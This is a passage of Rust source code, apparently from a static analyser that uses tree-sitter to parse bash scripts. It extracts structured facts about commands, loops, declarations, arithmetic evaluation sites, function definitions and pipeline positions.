fn repair_span_start(source: &str, span: &mut SourceSpan, repairs: &[(SourceSpan, usize)]) {
    let Some(new_start) = repairs
        .iter()
        .filter(|(original, _)| original == span)
        .map(|(_, start)| *start)
        .min()
    else {
        return;
    };

    *span = source_span_for_offsets(source, new_start, span.end_byte);
}

fn source_span_for_offsets(source: &str, start_byte: usize, end_byte: usize) -> SourceSpan {
    let (start_row, start_column) = source_position_for_offset(source, start_byte);
    let (end_row, end_column) = source_position_for_offset(source, end_byte);

    SourceSpan {
        start_byte,
        end_byte,
        start_row,
        start_column,
        end_row,
        end_column,
    }
}

fn source_position_for_offset(source: &str, offset: usize) -> (usize, usize) {
    let mut row = 0usize;
    let mut column = 0usize;

    for byte in source.as_bytes().iter().copied().take(offset) {
        if byte == b'\n' {
            row += 1;
            column = 0;
        } else {
            column += 1;
        }
    }

    (row, column)
}

fn collect_diagnostics(root: Node<'_>, source: &[u8]) -> Vec<ParseDiagnostic> {
    let mut diagnostics = Vec::new();

    walk(root, &mut |node| {
        let kind = if node.is_error() {
            Some(DiagnosticKind::ErrorNode)
        } else if node.is_missing() {
            Some(DiagnosticKind::MissingNode)
        } else {
            None
        };

        if let Some(kind) = kind {
            diagnostics.push(ParseDiagnostic {
                kind,
                node_kind: node.kind().to_string(),
                text: source_text(node, source),
                span: span_for(node),
            });
        }
    });

    diagnostics
}

fn extract_for_loops(root: Node<'_>, source: &[u8]) -> Vec<crate::ForLoopFact> {
    let mut loops = Vec::new();
    walk(root, &mut |node| {
        if node.kind() != "for_statement" || is_nested_shell_substructure(node) {
            return;
        }
        let Some(variable) = node.child_by_field_name("variable") else {
            return;
        };
        let Some(body) = node.child_by_field_name("body") else {
            return;
        };
        let mut explicit = false;
        let mut items = Vec::new();
        for child in all_children(node) {
            if child.kind() == "in" {
                explicit = true;
                continue;
            }
            if child.start_byte() >= body.start_byte() {
                break;
            }
            if !explicit || !child.is_named() {
                continue;
            }
            // Unsupported header words remain opaque rather than disappearing.
            let (text, quoted) = extract_token_text(child, source)
                .unwrap_or_else(|| (source_text(child, source), false));
            items.push(CommandToken {
                text,
                quoted,
                node_kind: child.kind().into(),
                span: span_for(child),
                kind: CommandTokenKind::Arg,
                implicit_input_source: None,
                runtime_argument_domain: None,
                runtime_data: false,
                command_substitutions: command_substitutions_for_expansion_node(child, source),
            });
        }
        loops.push(crate::ForLoopFact {
            variable: source_text(variable, source),
            items: explicit.then_some(items),
            span: span_for(node),
            body_span: span_for(body),
            shell_scope_span: enclosing_shell_scope(node),
        });
    });
    loops
}

fn extract_commands(root: Node<'_>, source: &[u8]) -> Vec<CommandFact> {
    let mut commands = Vec::new();

    walk(root, &mut |node| match node.kind() {
        "command" => {
            if is_nested_shell_substructure(node) {
                return;
            }

            if node
                .parent()
                .is_some_and(|parent| parent.kind() == "redirected_statement")
            {
                return;
            }

            if let Some(command) = extract_single_command(node, source) {
                commands.push(command);
            }
        }
        "test_command" => {
            if is_nested_shell_substructure(node) {
                return;
            }

            if let Some(command) = extract_test_command(node, source) {
                commands.push(command);
            }
        }
        "redirected_statement" => {
            if is_nested_shell_substructure(node) {
                return;
            }

            for i in 0..node.child_count() {
                let Some(child) = child_at(node, i) else {
                    continue;
                };

                if child.kind() == "command" {
                    if let Some(command) = extract_single_command(child, source) {
                        commands.push(command);
                    }
                    break;
                }
            }
        }
        _ => {}
    });

    commands
}

fn extract_test_command(node: Node<'_>, source: &[u8]) -> Option<CommandFact> {
    let opener = child_at(node, 0)?;
    let command_name = source_text(opener, source);
    if command_name != "[" && command_name != "[[" {
        return None;
    }

    let closer = if command_name == "[" { "]" } else { "]]" };
    let mut tokens = Vec::new();

    for i in 1..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        if child.kind() == closer {
            tokens.push(CommandToken {
                text: source_text(child, source),
                implicit_input_source: None,
                runtime_argument_domain: None,
                runtime_data: false,
                kind: CommandTokenKind::Arg,
                quoted: false,
                node_kind: child.kind().to_string(),
                span: span_for(child),
                command_substitutions: Vec::new(),
            });
            continue;
        }

        append_test_expression_tokens(child, source, &mut tokens);
    }

    let pipeline = find_ancestor_kind(node, "pipeline");
    let pipeline_position =
        pipeline.and_then(|pipeline| pipeline_position_for_command(node, pipeline));

    Some(CommandFact {
        command_name: Some(command_name),
        command_name_runtime_data: false,
        text: source_text(node, source),
        prefix_assignments: Vec::new(),
        tokens,
        in_pipeline: pipeline.is_some(),
        pipeline_position,
        pipeline_span: pipeline.map(span_for),
        terminator: statement_terminator_for(node),
        guarded: is_guarded_command(node),
        conditional_execution: conditionally_executed_in_shell(node),
        shell_scope_span: enclosing_shell_scope(node),
        subshell_span: nearest_ancestor_span(node, &["subshell"]),
        control_flow_span: outermost_ancestor_span(
            node,
            &[
                "if_statement",
                "while_statement",
                "for_statement",
                "c_style_for_statement",
                "case_statement",
            ],
        ),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    })
}

fn append_test_expression_tokens(node: Node<'_>, source: &[u8], tokens: &mut Vec<CommandToken>) {
    if let Some((text, quoted)) = extract_token_text(node, source) {
        tokens.push(CommandToken {
            text,
            implicit_input_source: None,
            runtime_argument_domain: None,
            runtime_data: false,
            kind: CommandTokenKind::Arg,
            quoted,
            node_kind: node.kind().to_string(),
            span: span_for(node),
            command_substitutions: command_substitutions_for_expansion_node(node, source),
        });
        return;
    }

    if node.kind() == "test_operator" {
        tokens.push(CommandToken {
            text: source_text(node, source),
            implicit_input_source: None,
            runtime_argument_domain: None,
            runtime_data: false,
            kind: CommandTokenKind::Arg,
            quoted: false,
            node_kind: node.kind().to_string(),
            span: span_for(node),
            command_substitutions: Vec::new(),
        });
        return;
    }

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        append_test_expression_tokens(child, source, tokens);
    }
}

fn extract_declaration_commands(root: Node<'_>, source: &[u8]) -> Vec<DeclarationCommandFact> {
    let mut declarations = Vec::new();

    walk(root, &mut |node| {
        if node.kind() == "declaration_command" {
            if is_nested_shell_substructure(node) {
                return;
            }

            declarations.push(parse_declaration_command(node, source));
        }
    });

    declarations
}

fn extract_assignment_commands(root: Node<'_>, source: &[u8]) -> Vec<AssignmentCommandFact> {
    let mut assignments = Vec::new();

    walk(root, &mut |node| match node.kind() {
        "variable_assignments" => {
            if is_nested_shell_substructure(node) || find_ancestor_kind(node, "command").is_some() {
                return;
            }

            assignments.push(parse_assignment_command(node, source));
        }
        "variable_assignment" => {
            if is_nested_shell_substructure(node)
                || find_ancestor_kind(node, "command").is_some()
                || find_ancestor_kind(node, "declaration_command").is_some()
                || find_ancestor_kind(node, "variable_assignments").is_some()
            {
                return;
            }

            assignments.push(parse_assignment_command(node, source));
        }
        _ => {}
    });

    assignments
}

fn parse_declaration_command(node: Node<'_>, source: &[u8]) -> DeclarationCommandFact {
    let mut kind = None;
    let mut options = Vec::new();
    let mut names = Vec::new();
    let mut assignments = Vec::new();
    let mut options_open = true;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        match child.kind() {
            "declare" => kind = Some(DeclarationCommandKind::Declare),
            "typeset" => kind = Some(DeclarationCommandKind::Typeset),
            "export" => kind = Some(DeclarationCommandKind::Export),
            "readonly" => kind = Some(DeclarationCommandKind::Readonly),
            "local" => kind = Some(DeclarationCommandKind::Local),
            "variable_name" => {
                options_open = false;
                names.push(source_text(child, source));
            }
            "variable_assignment" => {
                options_open = false;
                if let Some(assignment) = parse_variable_assignment(child, source) {
                    assignments.push(assignment);
                }
            }
            _ => {
                if let Some((text, _quoted)) = extract_token_text(child, source) {
                    collect_state_builtin_argument(
                        text,
                        &mut options_open,
                        &mut options,
                        &mut names,
                    );
                }
            }
        }
    }

    DeclarationCommandFact {
        unconditional_current_shell: unconditional_current_shell(node),
        shell_scope_span: enclosing_shell_scope(node),
        conditional_execution: conditionally_executed_in_shell(node),
        kind: kind.expect("declaration_command should have a declaration keyword"),
        options,
        names,
        assignments,
        text: source_text(node, source),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn parse_assignment_command(node: Node<'_>, source: &[u8]) -> AssignmentCommandFact {
    let mut assignments = Vec::new();

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        match child.kind() {
            "variable_assignment" => {
                if let Some(assignment) = parse_variable_assignment(child, source) {
                    assignments.push(assignment);
                }
            }
            _ => {}
        }
    }

    if node.kind() == "variable_assignment" {
        if let Some(assignment) = parse_variable_assignment(node, source) {
            assignments.push(assignment);
        }
    }

    AssignmentCommandFact {
        unconditional_current_shell: unconditional_current_shell(node),
        shell_scope_span: enclosing_shell_scope(node),
        conditional_execution: conditionally_executed_in_shell(node),
        assignments,
        text: source_text(node, source),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

fn extract_unset_commands(root: Node<'_>, source: &[u8]) -> Vec<UnsetCommandFact> {
    let mut unsets = Vec::new();

    walk(root, &mut |node| {
        if node.kind() == "unset_command" {
            if is_nested_shell_substructure(node) {
                return;
            }

            unsets.push(parse_unset_command(node, source));
        }
    });

    unsets
}

fn extract_shell_evaluations(
    root: Node<'_>,
    source: &[u8],
    shell: ShellKind,
) -> Vec<crate::ShellEvaluationSite> {
    use crate::{ShellEvaluationKind as K, ShellEvaluationSite};
    if !matches!(shell, ShellKind::Bash) {
        return Vec::new();
    }
    let mut sites = Vec::new();
    let declarations = extract_declaration_commands(root, source);
    walk(root, &mut |node| {
        if is_nested_shell_substructure(node) {
            return;
        }
        let mut add = |kind, value: Node<'_>, arithmetic_text: Option<String>| {
            let mut input = assignment_value_fact_from_node(value, source);
            if let Some(text) = arithmetic_text {
                input.text = text;
                input.node_kind = "arithmetic_expression".into();
            }
            let mut numeric_locals = Vec::new();
            let mut numeric_scope_span = None;
            if let Some(loop_node) = (node.kind() == "c_style_for_statement")
                .then_some(node)
                .or_else(|| find_ancestor_kind(node, "c_style_for_statement"))
                && let Some(init) = loop_node.child_by_field_name("initializer")
                && let (Some(name), Some(value)) = (
                    init.child_by_field_name("name"),
                    init.child_by_field_name("value"),
                )
                && value.kind() == "number"
            {
                numeric_locals.push(source_text(name, source));
                numeric_scope_span = Some(span_for(loop_node));
            }
            let mut owner = node;
            while let Some(parent) = owner.parent() {
                if matches!(
                    parent.kind(),
                    "program"
                        | "list"
                        | "do_group"
                        | "subshell"
                        | "if_statement"
                        | "while_statement"
                        | "for_statement"
                        | "c_style_for_statement"
                ) || (parent.kind() == "compound_statement"
                    && !source_text(parent, source).starts_with("(("))
                {
                    break;
                }
                owner = parent;
            }
            sites.push(ShellEvaluationSite {
                kind,
                input,
                top_level_span: top_level_command_span(owner),
                shell_scope_span: enclosing_shell_scope(node),
                numeric_locals,
                numeric_scope_span,
                conditional_execution: conditionally_executed_in_shell(node),
            });
        };
        match node.kind() {
            "arithmetic_expansion" => {
                let text = source_text(node, source);
                let body = text
                    .strip_prefix("$((")
                    .and_then(|s| s.strip_suffix("))"))
                    .or_else(|| text.strip_prefix("$[").and_then(|s| s.strip_suffix(']')));
                if let Some(body) = body {
                    add(K::Arithmetic, node, Some(body.into()));
                }
            }
            "compound_statement" if source_text(node, source).starts_with("((") => {
                let text = source_text(node, source);
                if let Some(body) = text.strip_prefix("((").and_then(|s| s.strip_suffix("))")) {
                    add(K::Arithmetic, node, Some(body.into()));
                }
            }
            "c_style_for_statement" => {
                for field in ["initializer", "condition", "update"] {
                    if let Some(value) = node.child_by_field_name(field) {
                        add(K::Arithmetic, value, Some(source_text(value, source)));
                    }
                }
            }
            "subscript"
                if find_ancestor_kind(node, "arithmetic_expansion").is_none()
                    && !find_ancestor_kind(node, "compound_statement")
                        .is_some_and(|n| source_text(n, source).starts_with("((")) =>
            {
                if let (Some(name), Some(index)) = (
                    node.child_by_field_name("name"),
                    node.child_by_field_name("index"),
                ) {
                    add(
                        K::ArrayIndex {
                            name: source_text(name, source),
                        },
                        index,
                        Some(source_text(index, source)),
                    );
                }
            }
            "unset_command" => {
                let mut functions_only = false;
                let mut options = true;
                for value in all_children(node).into_iter().filter(|n| n.is_named()) {
                    let text = source_text(value, source);
                    if options && text == "--" {
                        options = false;
                        continue;
                    }
                    if options && text.starts_with('-') {
                        functions_only |= text[1..].contains('f') || text[1..].contains('n');
                        continue;
                    }
                    options = false;
                    add(K::UnsetOperand { functions_only }, value, None);
                }
            }
            "command"
                if node
                    .child_by_field_name("name")
                    .is_some_and(|n| source_text(n, source) == "let") =>
            {
                for value in all_children(node)
                    .into_iter()
                    .filter(|n| n.is_named() && n.kind() != "command_name")
                {
                    add(K::ArithmeticBuiltin, value, None);
                }
            }
            "declaration_command" => {
                let declaration = parse_declaration_command(node, source);
                if declaration
                    .options
                    .iter()
                    .any(|o| o.starts_with('-') && o[1..].contains('i'))
                {
                    for value in all_children(node)
                        .into_iter()
                        .filter(|n| n.kind() == "variable_assignment")
                    {
                        if let Some(rhs) = value.child_by_field_name("value") {
                            add(K::ArithmeticBuiltin, rhs, None);
                        }
                    }
                }
            }
            "variable_assignment"
                if node
                    .parent()
                    .is_none_or(|p| p.kind() != "declaration_command") =>
            {
                if let (Some(name), Some(rhs)) = (
                    node.child_by_field_name("name"),
                    node.child_by_field_name("value"),
                ) {
                    if name.kind() == "subscript"
                        && let (Some(array), Some(index)) = (
                            name.child_by_field_name("name"),
                            name.child_by_field_name("index"),
                        )
                    {
                        add(
                            K::ArrayElementAssignment {
                                name: source_text(array, source),
                                index: source_text(index, source),
                            },
                            rhs,
                            None,
                        );
                    }
                    let target = source_text(name, source);
                    let target = target.split('[').next().unwrap_or(&target);
                    let integer = declarations
                        .iter()
                        .rev()
                        .find(|d| {
                            d.span.start_byte < node.start_byte()
                                && d.shell_scope_span.as_ref().is_none_or(|s| {
                                    node.start_byte() >= s.start_byte
                                        && node.start_byte() < s.end_byte
                                })
                                && (d.names.iter().any(|n| n == target)
                                    || d.assignments.iter().any(|a| a.name == target))
                                && d.options.iter().any(|o| {
                                    (o.starts_with('-') || o.starts_with('+'))
                                        && o[1..].contains('i')
                                })
                                && (!d.conditional_execution
                                    || d.options
                                        .iter()
                                        .any(|o| o.starts_with('-') && o[1..].contains('i')))
                        })
                        .is_some_and(|d| {
                            d.options
                                .iter()
                                .any(|o| o.starts_with('-') && o[1..].contains('i'))
                        });
                    if integer {
                        add(K::ArithmeticBuiltin, rhs, None);
                    }
                }
            }
            _ => {}
        }
    });
    sites.sort_by_key(|s| s.input.span.start_byte);
    sites
}

/// Parse expression structure without evaluating its variables or commands.
pub fn parse_arithmetic_references(expression: &str) -> Option<Vec<crate::ArithmeticReference>> {
    use crate::ArithmeticReference as R;
    if expression.len() > 8192 {
        return None;
    }
    let source = format!("(( {expression} ))");
    let mut parser = Parser::new();
    parser
        .set_language(&language_for(ShellKind::Bash).ok()?)
        .ok()?;
    let tree = parser.parse(&source, None)?;
    let root = tree.root_node();
    if root.has_error() || root.named_child_count() != 1 {
        return None;
    }
    let expression_node = root.named_child(0)?;
    if expression_node.kind() != "compound_statement" || expression_node.end_byte() != source.len()
    {
        return None;
    }
    fn collect(node: Node<'_>, source: &[u8], budget: &mut usize) -> Vec<R> {
        if *budget == 0 {
            return vec![R::Unsupported("arithmetic syntax budget exceeded".into())];
        }
        *budget -= 1;
        match node.kind() {
            "number" => Vec::new(),
            "word" | "variable_name" => {
                let text = source_text(node, source);
                if text.as_bytes().first().is_some_and(u8::is_ascii_digit)
                    && text
                        .chars()
                        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '#' | '@' | '_'))
                {
                    Vec::new()
                } else if !text.is_empty()
                    && text.chars().enumerate().all(|(i, c)| {
                        c.is_ascii_alphabetic() || c == '_' || (i > 0 && c.is_ascii_digit())
                    })
                {
                    vec![R::Variable(text)]
                } else {
                    vec![R::Unsupported(text)]
                }
            }
            "subscript" => match (
                node.child_by_field_name("name"),
                node.child_by_field_name("index"),
            ) {
                (Some(name), Some(index)) => vec![R::Array {
                    name: source_text(name, source),
                    index: source_text(index, source),
                    read_value: true,
                }],
                _ => vec![R::Unsupported(source_text(node, source))],
            },
            "command_substitution" => {
                let text = source_text(node, source);
                match command_substitution_body_text(&text) {
                    Some(body_text) => {
                        vec![R::CommandSubstitution(crate::CommandSubstitutionFact {
                            text,
                            body_text,
                            span: span_for(node),
                        })]
                    }
                    _ => vec![R::Unsupported(text)],
                }
            }
            "variable_assignment" => {
                let Some(name) = node.child_by_field_name("name") else {
                    return vec![R::Unsupported(source_text(node, source))];
                };
                let value = node
                    .child_by_field_name("value")
                    .map(|v| collect(v, source, budget))
                    .unwrap_or_default();
                let reads_previous = source_text(node, source)
                    .get(name.end_byte() - node.start_byte()..)
                    .is_some_and(|s| !s.starts_with('='));
                if name.kind() == "subscript" {
                    let mut target = collect(name, source, budget);
                    if let Some(R::Array { read_value, .. }) = target.first_mut() {
                        *read_value = reads_previous;
                    }
                    target.extend(value);
                    target
                } else {
                    vec![R::Assignment {
                        name: source_text(name, source),
                        reads_previous,
                        value,
                    }]
                }
            }
            "binary_expression"
                if node.child_by_field_name("operator").is_some_and(|op| {
                    matches!(
                        source_text(op, source).as_str(),
                        "=" | "+=" | "-=" | "*=" | "/=" | "%=" | "<<=" | ">>=" | "&=" | "^=" | "|="
                    )
                }) =>
            {
                let (Some(left), Some(right)) = (
                    node.child_by_field_name("left"),
                    node.child_by_field_name("right"),
                ) else {
                    return vec![R::Unsupported(source_text(node, source))];
                };
                let reads_previous = node
                    .child_by_field_name("operator")
                    .is_some_and(|op| source_text(op, source) != "=");
                let value = collect(right, source, budget);
                if left.kind() == "subscript" {
                    let mut target = collect(left, source, budget);
                    if let Some(R::Array { read_value, .. }) = target.first_mut() {
                        *read_value = reads_previous;
                    }
                    target.extend(value);
                    target
                } else {
                    vec![R::Assignment {
                        name: source_text(left, source),
                        reads_previous,
                        value,
                    }]
                }
            }
            "simple_expansion" | "expansion" | "string" | "raw_string" | "ansi_c_string"
            | "concatenation" => {
                let (text, quoted) = extract_token_text(node, source)
                    .unwrap_or_else(|| (source_text(node, source), false));
                vec![R::ExpandedWord {
                    text,
                    quoted,
                    node_kind: node.kind().into(),
                }]
            }
            "binary_expression"
                if node
                    .child_by_field_name("operator")
                    .is_some_and(|op| matches!(source_text(op, source).as_str(), "&&" | "||")) =>
            {
                let mut result = node
                    .child_by_field_name("left")
                    .map(|n| collect(n, source, budget))
                    .unwrap_or_default();
                if let Some(right) = node.child_by_field_name("right") {
                    result.push(R::Optional(collect(right, source, budget)));
                }
                result
            }
            "ternary_expression" => {
                let mut children = all_children(node).into_iter().filter(|c| c.is_named());
                let mut result = children
                    .next()
                    .map(|c| collect(c, source, budget))
                    .unwrap_or_default();
                result.extend(children.map(|c| R::Optional(collect(c, source, budget))));
                result
            }
            "compound_statement"
            | "binary_expression"
            | "unary_expression"
            | "postfix_expression"
            | "parenthesized_expression" => all_children(node)
                .into_iter()
                .filter(|c| c.is_named())
                .flat_map(|c| collect(c, source, budget))
                .collect(),
            _ => vec![R::Unsupported(source_text(node, source))],
        }
    }
    Some(collect(expression_node, source.as_bytes(), &mut 512))
}

pub fn static_array_values(text: &str) -> Option<Vec<String>> {
    if text.len() > 8192 {
        return None;
    }
    let source = format!("__array__={text}");
    let mut parser = Parser::new();
    parser
        .set_language(&language_for(ShellKind::Bash).ok()?)
        .ok()?;
    let tree = parser.parse(&source, None)?;
    let root = tree.root_node();
    if root.has_error() || root.named_child_count() != 1 {
        return None;
    }
    let array = root.named_child(0)?.child_by_field_name("value")?;
    if array.kind() != "array" || array.end_byte() != source.len() {
        return None;
    }
    all_children(array)
        .into_iter()
        .filter(|n| n.is_named())
        .map(|value| decode_static_word_node(value, source.as_bytes()))
        .collect()
}

fn extract_function_definitions(root: Node<'_>, source: &[u8]) -> Vec<FunctionDefinitionFact> {
    let mut definitions = Vec::new();

    walk(root, &mut |node| {
        if node.kind() != "function_definition" || is_nested_shell_substructure(node) {
            return;
        }

        let Some(name_node) = node.child_by_field_name("name") else {
            return;
        };
        let Some(body_node) = node.child_by_field_name("body") else {
            return;
        };

        definitions.push(FunctionDefinitionFact {
            shell_scope_span: enclosing_shell_scope(node),
            conditional_execution: conditionally_executed_in_shell(node),
            name: source_text(name_node, source),
            body_text: function_body_text(body_node, source),
            text: source_text(node, source),
            top_level_span: top_level_command_span(node),
            span: span_for(node),
        });
    });

    definitions
}

fn function_body_text(body_node: Node<'_>, source: &[u8]) -> String {
    if body_node.kind() != "compound_statement" {
        return source_text(body_node, source);
    }

    let text = source_text(body_node, source);
    let Some(body) = text
        .strip_prefix('{')
        .and_then(|body| body.strip_suffix('}'))
    else {
        return text;
    };

    body.trim().to_string()
}

fn parse_unset_command(node: Node<'_>, source: &[u8]) -> UnsetCommandFact {
    let mut options = Vec::new();
    let mut names = Vec::new();
    let mut options_open = true;

    for i in 0..node.child_count() {
        let Some(child) = child_at(node, i) else {
            continue;
        };

        match child.kind() {
            "unset" => {}
            "variable_name" => {
                options_open = false;
                names.push(source_text(child, source));
            }
            _ => {
                if let Some((text, _quoted)) = extract_token_text(child, source) {
                    collect_state_builtin_argument(
                        text,
                        &mut options_open,
                        &mut options,
                        &mut names,
                    );
                }
            }
        }
    }

    UnsetCommandFact {
        unconditional_current_shell: unconditional_current_shell(node),
        shell_scope_span: enclosing_shell_scope(node),
        conditional_execution: conditionally_executed_in_shell(node),
        options,
        names,
        text: source_text(node, source),
        top_level_span: top_level_command_span(node),
        span: span_for(node),
    }
}

// Bash builtins stop option parsing at the first operand (or `--`). Keep
// dynamic words in the options channel as unresolved syntax, never silently
// turn an operand after that boundary into a modifier.
fn collect_state_builtin_argument(
    text: String,
    options_open: &mut bool,
    options: &mut Vec<String>,
    names: &mut Vec<String>,
) {
    if *options_open && text == "--" {
        options.push(text);
        *options_open = false;
    } else if *options_open && text.starts_with('-') && text.len() > 1 {
        options.push(text);
    } else if text.contains('$') || text.contains('`') || text.contains('\\') {
        // The semantic decoder treats non-option syntax as unresolved.
        options.push(text);
        *options_open = false;
    } else {
        *options_open = false;
        names.push(text);
    }
}

fn extract_single_command(node: Node<'_>, source: &[u8]) -> Option<CommandFact> {
    let scope = simple_command_scope(node);
    let mut command_name = None;
    let mut command_name_span: Option<SourceSpan> = None;
    let mut prefix_assignments = Vec::new();
    let mut tokens: Vec<CommandToken> = Vec::new();
    let mut dashdash_seen = false;
    let mut joined_words = false;

    for child in simple_command_words(node) {
        if child.kind() == "variable_assignment" {
            if command_name.is_none() {
                if let Some(assignment) = parse_variable_assignment(child, source) {
                    prefix_assignments.push(assignment);
                }
            }
            continue;
        }

        if child.kind() == "command_name" {
            command_name = Some(source_text(child, source));
            command_name_span = Some(span_for(child));
            continue;
        }

        if matches!(
            child.kind(),
            "file_redirect" | "herestring_redirect" | "heredoc_redirect"
        ) {
            continue;
        }

        let Some((text, quoted)) = extract_token_text(child, source) else {
            continue;
        };

        if tokens.is_empty()
            && let Some(name_span) = &mut command_name_span
            && continuation_gap(source, name_span.end_byte, child.start_byte())
        {
            command_name = Some(
                String::from_utf8_lossy(&source[name_span.start_byte..child.end_byte()])
                    .into_owned(),
            );
            name_span.end_byte = child.end_byte();
            name_span.end_row = child.end_position().row;
            name_span.end_column = child.end_position().column;
            continue;
        }

        if let Some(previous) = tokens.last_mut()
            && (previous.span.end_byte == child.start_byte()
                || continuation_gap(source, previous.span.end_byte, child.start_byte()))
        {
            // A backslash-newline is removed before shell word tokenization.
            // Only that exact lexical gap can join nonadjacent AST fragments;
            // spaces, redirects, delimiters and ordinary newlines cannot.
            previous.text =
                String::from_utf8_lossy(&source[previous.span.start_byte..child.end_byte()])
                    .into_owned();
            previous.quoted = false;
            previous.node_kind = "concatenation".into();
            joined_words = true;
            previous.span.end_byte = child.end_byte();
            previous.span.end_row = child.end_position().row;
            previous.span.end_column = child.end_position().column;
            previous
                .command_substitutions
                .extend(command_substitutions_for_expansion_node(child, source));
            continue;
        }

        let kind = if text == "--" {
            dashdash_seen = true;
            CommandTokenKind::DashDash
        } else if !dashdash_seen && text.len() > 1 && text.starts_with('-') {
            CommandTokenKind::Flag
        } else {
            CommandTokenKind::Arg
        };

        tokens.push(CommandToken {
            text,
            implicit_input_source: None,
            runtime_argument_domain: None,
            runtime_data: false,
            kind,
            quoted,
            node_kind: child.kind().to_string(),
            span: span_for(child),
            command_substitutions: command_substitutions_for_expansion_node(child, source),
        });
    }

    if joined_words || tokens.iter().any(|token| token.text.contains("\\\n")) {
        let mut terminated = false;
        for token in &mut tokens {
            let decoded = decode_static_shell_argument(&token.text, token.quoted, &token.node_kind);
            let spelling = decoded.as_deref().unwrap_or(&token.text);
            token.kind = if !terminated && spelling == "--" {
                terminated = true;
                CommandTokenKind::DashDash
            } else if !terminated && spelling.starts_with('-') && spelling.len() > 1 {
                CommandTokenKind::Flag
            } else {
                CommandTokenKind::Arg
            };
        }
    }
    if command_name.is_none() && tokens.is_empty() {
        return None;
    }

    let pipeline = find_ancestor_kind(node, "pipeline");
    let pipeline_position =
        pipeline.and_then(|pipeline| pipeline_position_for_command(node, pipeline));

    Some(CommandFact {
        command_name,
        command_name_runtime_data: false,
        text: source_text(scope, source),
        prefix_assignments,
        tokens,
        in_pipeline: pipeline.is_some(),
        pipeline_position,
        pipeline_span: pipeline.map(span_for),
        terminator: statement_terminator_for(node),
        guarded: is_guarded_command(node),
        conditional_execution: conditionally_executed_in_shell(node),
        shell_scope_span: enclosing_shell_scope(node),
        subshell_span: nearest_ancestor_span(node, &["subshell"]),
        control_flow_span: outermost_ancestor_span(
            node,
            &[
                "if_statement",
                "while_statement",
                "for_statement",
                "c_style_for_statement",
                "case_statement",
            ],
        ),
        top_level_span: top_level_command_span(node),
        span: span_for(scope),
    })
}

fn continuation_gap(source: &[u8], start: usize, end: usize) -> bool {
    let Some(gap) = source.get(start..end) else {
        return false;
    };
    !gap.is_empty() && gap.len() % 2 == 0 && gap.chunks_exact(2).all(|pair| pair == b"\\\n")
}

fn simple_command_scope(node: Node<'_>) -> Node<'_> {
    node.parent()
        .filter(|parent| parent.kind() == "redirected_statement")
        .unwrap_or(node)
}

// tree-sitter-bash intentionally groups all literals following a file
// redirect into repeated `destination` fields. Only the first is the shell
// redirection operand; the others remain argv of this SAME simple command.
// Never descend into a destination/expansion or a compound statement.
fn simple_command_words(node: Node<'_>) -> Vec<Node<'_>> {
    fn append<'a>(node: Node<'a>, words: &mut Vec<Node<'a>>) {
        for child in all_children(node) {
            match child.kind() {
                "file_redirect" => words.extend(file_redirect_argv(child)),
                "herestring_redirect" | "heredoc_redirect" => {}
                _ => words.push(child),
            }
        }
    }
    let scope = simple_command_scope(node);
    let mut words = Vec::new();
    if scope.id() == node.id() {
        append(node, &mut words);
    } else {
        for child in all_children(scope) {
            if child.id() == node.id() {
                append(child, &mut words);
            } else if child.kind() == "file_redirect" {
                words.extend(file_redirect_argv(child));
            }
        }
    }
    words
}

fn file_redirect_argv(node: Node<'_>) -> Vec<Node<'_>> {
    let closes_fd = all_children(node)
        .iter()
        .any(|child| matches!(child.kind(), "<&-" | ">&-"));
    let mut cursor = node.walk();
    let words: Vec<_> = node
        .children_by_field_name("destination", &mut cursor)
        .collect();
    let mut start = usize::from(!closes_fd && !words.is_empty());
    while start > 0
        && start < words.len()
        && words[start - 1].end_byte() == words[start].start_byte()
    {
        start += 1;
    }
    words.into_iter().skip(start).collect()
}

fn top_level_command_span(node: Node<'_>) -> SourceSpan {
    let mut current = node;

    while let Some(parent) = current.parent() {
        match parent.kind() {
            "redirected_statement" | "pipeline" => {
                current = parent;
            }
            _ => break,
        }
    }

    span_for(current)
}

fn pipeline_position_for_command(node: Node<'_>, pipeline: Node<'_>) -> Option<PipelinePosition> {
    let statement = direct_pipeline_statement(node)?;
    let statements = named_children_of_kind(pipeline, None)
        .into_iter()
        .filter(|child| child.kind() != "comment")
        .collect::<Vec<_>>();

    let statement_index = statements
        .iter()
        .position(|candidate| candidate.id() == statement.id())?;
    let len = statements.len();

    Some(match (statement_index, len) {
        (0, 1) => PipelinePosition::Only,
        (0, _) => PipelinePosition::First,
        (index, total) if index + 1 == total => PipelinePosition::Last,
        _ => PipelinePosition::Middle,
    })
}

fn direct_pipeline_statement(mut node: Node<'_>) -> Option<Node<'_>> {
    while let Some(parent) = node.parent() {
        if parent.kind() == "pipeline" {
            return Some(node);
        }
        node = parent;
    }

    None
}

fn statement_terminator_for(node: Node<'_>) -> Option<StatementTerminator> {
    let statement = top_level_statement_node(node)?;
    let parent = statement.parent()?;
    let children = all_children(parent);
    let index = children
        .iter()
        .position(|child| child.id() == statement.id())?;

    let mut current = index + 1;
    while current < children.len() {
        let child = children[current];
        if child.is_named() {
            break;
        }

        let kind = child.kind();
        if kind == "&" {
            return Some(StatementTerminator::Background);
        }
        if kind == ";" || kind == ";;" {
            return Some(StatementTerminator::Sequence);
        }

        current += 1;
    }

    None
}

fn top_level_statement_node(mut node: Node<'_>) -> Option<Node<'_>> {
    while let Some(parent) = node.parent() {
        if is_statement_wrapper(parent.kind()) {
            node = parent;
            continue;
        }
        break;
    }

    Some(node)
}

fn is_statement_wrapper(kind: &str) -> bool {
    matches!(
        kind,
        "redirected_statement" | "pipeline" | "list" | "negated_command"
    )
}

fn unconditional_current_shell(node: Node<'_>) -> bool {
    !is_guarded_command(node)
        && find_ancestor_kind(node, "pipeline").is_none()
        && statement_terminator_for(node) != Some(StatementTerminator::Background)
}

fn enclosing_shell_scope(mut node: Node<'_>) -> Option<SourceSpan> {
    loop {
        if statement_terminator_for(node) == Some(StatementTerminator::Background) {
            return Some(span_for(top_level_statement_node(node)?));
        }
        let parent = node.parent()?;
        if parent.kind() == "subshell" {
            return Some(span_for(parent));
        }
        if parent.kind() == "pipeline" {
